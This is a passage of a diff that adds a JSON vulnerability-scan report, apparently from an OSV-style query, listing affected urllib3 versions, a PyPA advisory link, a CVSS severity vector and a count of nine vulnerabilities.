+                "1.25.4",
+                "1.25.5",
+                "1.25.6",
+                "1.25.7",
+                "1.25.8",
+                "1.25.9",
+                "1.26.0",
+                "1.26.1",
+                "1.26.10",
+                "1.26.11",
+                "1.26.12",
+                "1.26.13",
+                "1.26.14",
+                "1.26.15",
+                "1.26.16",
+                "1.26.17",
+                "1.26.2",
+                "1.26.3",
+                "1.26.4",
+                "1.26.5",
+                "1.26.6",
+                "1.26.7",
+                "1.26.8",
+                "1.26.9",
+                "1.3",
+                "1.4",
+                "1.5",
+                "1.6",
+                "1.7",
+                "1.7.1",
+                "1.8",
+                "1.8.2",
+                "1.8.3",
+                "1.9",
+                "1.9.1",
+                "2.0.0",
+                "2.0.1",
+                "2.0.2",
+                "2.0.3",
+                "2.0.4",
+                "2.0.5",
+                "2.0.6"
+              ],
+              "database_specific": {
+                "source": "https://github.com/pypa/advisory-database/blob/main/vulns/urllib3/PYSEC-2023-212.yaml"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V3",
+              "score": "CVSS:3.1/AV:A/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N"
+            }
+          ]
+        }
+      ],
+      "vulnerability_count": 9,
+      "has_vulnerabilities": true,
+      "query_time": "2026-03-05T18:11:28.681540"
+    }
+  ]
+}
